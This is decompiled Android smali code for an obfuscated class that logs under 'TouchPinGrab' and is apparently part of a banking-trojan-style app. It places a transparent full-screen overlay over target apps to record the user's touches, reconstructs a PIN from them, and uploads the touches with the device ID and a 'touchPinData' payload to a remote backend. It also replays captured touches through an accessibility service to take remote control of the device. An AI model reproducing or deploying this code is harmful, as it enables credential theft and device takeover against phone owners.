.class public abstract Lڝږ؁ڋ/ه;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static final ؋:Landroid/os/Handler;

.field public static volatile ؠ:Z

.field public static volatile ء:Ljava/lang/String;

.field public static آ:Landroid/view/View;

.field public static أ:Landroid/view/WindowManager;

.field public static ؤ:Z

.field public static إ:I

.field public static ئ:J

.field public static final ا:Ljava/lang/StringBuilder;

.field public static ب:I

.field public static ة:Lڝږ؁ڋ/ا;

.field public static ت:Landroid/content/Context;


# direct methods
.method public static constructor <clinit>()V
    .locals 4

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v0, Lڝږ؁ڋ/ه;->؋:Landroid/os/Handler;

    const/4 v0, 0x0

    sput-boolean v0, Lڝږ؁ڋ/ه;->ؠ:Z

    const/4 v1, 0x0

    sput-object v1, Lڝږ؁ڋ/ه;->ء:Ljava/lang/String;

    sput-object v1, Lڝږ؁ڋ/ه;->آ:Landroid/view/View;

    sput-object v1, Lڝږ؁ڋ/ه;->أ:Landroid/view/WindowManager;

    sput-boolean v0, Lڝږ؁ڋ/ه;->ؤ:Z

    sput v0, Lڝږ؁ڋ/ه;->إ:I

    const-wide/16 v2, 0x0

    sput-wide v2, Lڝږ؁ڋ/ه;->ئ:J

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sput-object v0, Lڝږ؁ڋ/ه;->ا:Ljava/lang/StringBuilder;

    const/16 v0, 0x3c

    sput v0, Lڝږ؁ڋ/ه;->ب:I

    sput-object v1, Lڝږ؁ڋ/ه;->ت:Landroid/content/Context;

    return-void
.end method

.method public static ؋(Ljava/lang/String;)V
    .locals 12

    if-nez p0, :cond_0

    return-void

    :cond_0
    invoke-static {p0}, Lڝږ؁ڋ/ك;->آ(Ljava/lang/String;)Z

    move-result v0

    const/4 v1, 0x1

    const/4 v2, 0x0

    if-eqz v0, :cond_4

    sget-boolean v0, Lڝږ؁ڋ/ه;->ؠ:Z

    if-eqz v0, :cond_1

    sget-object v0, Lڝږ؁ڋ/ه;->ء:Ljava/lang/String;

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    :cond_1
    sget-boolean v0, Lڝږ؁ڋ/ه;->ؠ:Z

    if-eqz v0, :cond_2

    invoke-static {}, Lڝږ؁ڋ/ه;->ء()V

    :cond_2
    sget-object v0, Lڝږ؁ڋ/ه;->ت:Landroid/content/Context;

    if-eqz v0, :cond_7

    const-string v3, "TouchPinGrab"

    const-string v4, "Started for pkg="

    sget-boolean v5, Lڝږ؁ڋ/ه;->ؠ:Z

    if-eqz v5, :cond_3

    goto/16 :goto_1

    :cond_3
    sput-object p0, Lڝږ؁ڋ/ه;->ء:Ljava/lang/String;

    sput v2, Lڝږ؁ڋ/ه;->إ:I

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    sput-wide v5, Lڝږ؁ڋ/ه;->ئ:J

    sget-object v5, Lڝږ؁ڋ/ه;->ا:Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->setLength(I)V

    const/16 v5, 0x3c

    sput v5, Lڝږ؁ڋ/ه;->ب:I

    :try_start_0
    const-string v5, "window"

    invoke-virtual {v0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/WindowManager;

    sput-object v5, Lڝږ؁ڋ/ه;->أ:Landroid/view/WindowManager;

    new-instance v5, Landroid/view/View;

    invoke-direct {v5, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    sput-object v5, Lڝږ؁ڋ/ه;->آ:Landroid/view/View;

    invoke-virtual {v5, v2}, Landroid/view/View;->setBackgroundColor(I)V

    sget-object v0, Lڝږ؁ڋ/ه;->آ:Landroid/view/View;

    new-instance v5, Lڝږ؁ڋ/م;

    invoke-direct {v5}, Lڝږ؁ڋ/م;-><init>()V

    invoke-virtual {v0, v5}, Landroid/view/View;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/4 v7, -0x1

    const/4 v8, -0x1

    const/16 v9, 0x7f0

    const/16 v10, 0x28

    const/4 v11, -0x3

    move-object v6, v0

    invoke-direct/range {v6 .. v11}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sget-object v5, Lڝږ؁ڋ/ه;->أ:Landroid/view/WindowManager;

    sget-object v6, Lڝږ؁ڋ/ه;->آ:Landroid/view/View;

    invoke-interface {v5, v6, v0}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    sput-boolean v1, Lڝږ؁ڋ/ه;->ؠ:Z

    new-instance v0, Lڝږ؁ڋ/ا;

    const/16 v1, 0xc

    invoke-direct {v0, v1}, Lڝږ؁ڋ/ا;-><init>(I)V

    sput-object v0, Lڝږ؁ڋ/ه;->ة:Lڝږ؁ڋ/ا;

    sget-object v1, Lڝږ؁ڋ/ه;->؋:Landroid/os/Handler;

    sget v5, Lڝږ؁ڋ/ه;->ب:I

    int-to-long v5, v5

    const-wide/16 v7, 0x3e8

    mul-long/2addr v5, v7

    invoke-virtual {v1, v0, v5, v6}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, " timeout="

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget p0, Lڝږ؁ڋ/ه;->ب:I

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p0, "s"

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v3, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p0

    const-string v0, "startGrab error"

    invoke-static {v3, v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    sput-boolean v2, Lڝږ؁ڋ/ه;->ؠ:Z

    goto :goto_1

    :cond_4
    sget-boolean v0, Lڝږ؁ڋ/ه;->ؠ:Z

    if-eqz v0, :cond_7

    const-string v0, "launcher"

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "home"

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "com.sec.android.app.launcher"

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "com.google.android.apps.nexuslauncher"

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "com.miui.home"

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "com.huawei.android.launcher"

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "com.oppo.launcher"

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "com.vivo.launcher"

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_5

    goto :goto_0

    :cond_5
    move v1, v2

    :cond_6
    :goto_0
    if-eqz v1, :cond_7

    invoke-static {}, Lڝږ؁ڋ/ه;->ء()V

    :cond_7
    :goto_1
    return-void
.end method

.method public static ؠ(Ljava/lang/String;Ljava/lang/String;)V
    .locals 8

    sget-object v0, Lڝږ؁ڋ/ه;->ت:Landroid/content/Context;

    instance-of v1, v0, Landroid/accessibilityservice/AccessibilityService;

    const-string v2, "TouchPinGrab"

    if-nez v1, :cond_0

    const-string p0, "Replay: no service context"

    invoke-static {v2, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_0
    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    const-string v1, ";"

    invoke-virtual {p0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "Replay: "

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    array-length v3, p0

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v3, " touches for "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 p1, 0x0

    move v1, p1

    :goto_0
    array-length v2, p0

    if-ge v1, v2, :cond_2

    aget-object v2, p0, v1

    const-string v3, ","

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    array-length v3, v2

    const/4 v4, 0x2

    if-ge v3, v4, :cond_1

    goto :goto_1

    :cond_1
    aget-object v3, v2, p1

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    const/4 v4, 0x1

    aget-object v2, v2, v4

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    sget-object v4, Lڝږ؁ڋ/ه;->؋:Landroid/os/Handler;

    new-instance v5, Lڝږ؁ڋ/ل;

    invoke-direct {v5, v3, v2, v0, v1}, Lڝږ؁ڋ/ل;-><init>(IILandroid/accessibilityservice/AccessibilityService;I)V

    int-to-long v2, v1

    const-wide/16 v6, 0x190

    mul-long/2addr v2, v6

    invoke-virtual {v4, v5, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :goto_1
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_2
    return-void
.end method

.method public static ء()V
    .locals 12

    sget-boolean v0, Lڝږ؁ڋ/ه;->ؠ:Z

    if-nez v0, :cond_0

    return-void

    :cond_0
    :try_start_0
    sget-object v0, Lڝږ؁ڋ/ه;->آ:Landroid/view/View;

    if-eqz v0, :cond_1

    sget-object v1, Lڝږ؁ڋ/ه;->أ:Landroid/view/WindowManager;

    if-eqz v1, :cond_1

    invoke-interface {v1, v0}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    const/4 v0, 0x0

    sput-object v0, Lڝږ؁ڋ/ه;->آ:Landroid/view/View;

    sget-object v1, Lڝږ؁ڋ/ه;->ة:Lڝږ؁ڋ/ا;

    if-eqz v1, :cond_2

    sget-object v2, Lڝږ؁ڋ/ه;->؋:Landroid/os/Handler;

    invoke-virtual {v2, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    sput-object v0, Lڝږ؁ڋ/ه;->ة:Lڝږ؁ڋ/ا;

    :cond_2
    sget v1, Lڝږ؁ڋ/ه;->إ:I

    if-lez v1, :cond_8

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Session ended: pkg="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lڝږ؁ڋ/ه;->ء:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " touches="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget v2, Lڝږ؁ڋ/ه;->إ:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "TouchPinGrab"

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v1, "Session uploaded: touches="

    :try_start_1
    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v3

    if-eqz v3, :cond_8

    invoke-virtual {v3}, Lڜٟٱڀ/د;->آ()Z

    move-result v4

    if-nez v4, :cond_3

    goto/16 :goto_1

    :cond_3
    iget-object v4, v3, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    if-nez v4, :cond_4

    goto/16 :goto_1

    :cond_4
    iget-object v3, v3, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    if-nez v3, :cond_5

    goto :goto_1

    :cond_5
    sget-object v5, Lڝږ؁ڋ/ه;->ا:Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lڝږ؁ڋ/غ;->ء(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    const-string v8, "deviceId"

    invoke-virtual {v7, v8, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "pkg"

    sget-object v8, Lڝږ؁ڋ/ه;->ء:Ljava/lang/String;

    if-eqz v8, :cond_6

    sget-object v8, Lڝږ؁ڋ/ه;->ء:Ljava/lang/String;

    goto :goto_0

    :cond_6
    const-string v8, ""

    :goto_0
    invoke-virtual {v7, v3, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "touches"

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v3, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "touchCount"

    sget v5, Lڝږ؁ڋ/ه;->إ:I

    invoke-virtual {v7, v3, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v3, "duration"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    sget-wide v10, Lڝږ؁ڋ/ه;->ئ:J

    sub-long/2addr v8, v10

    invoke-virtual {v7, v3, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    const-string v3, "timestamp"

    sget-wide v8, Lڝږ؁ڋ/ه;->ئ:J

    invoke-virtual {v7, v3, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    if-eqz v6, :cond_7

    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_7

    const-string v3, "resolved"

    invoke-virtual {v7, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :cond_7
    const-string v3, "touchPinData"

    invoke-virtual {v4, v3, v7}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lڝږ؁ڋ/ه;->إ:I

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v1

    const-string v3, "uploadSession error"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_8
    :goto_1
    const/4 v1, 0x0

    sput-boolean v1, Lڝږ؁ڋ/ه;->ؠ:Z

    sput-object v0, Lڝږ؁ڋ/ه;->ء:Ljava/lang/String;

    sput-boolean v1, Lڝږ؁ڋ/ه;->ؤ:Z

    return-void
.end method
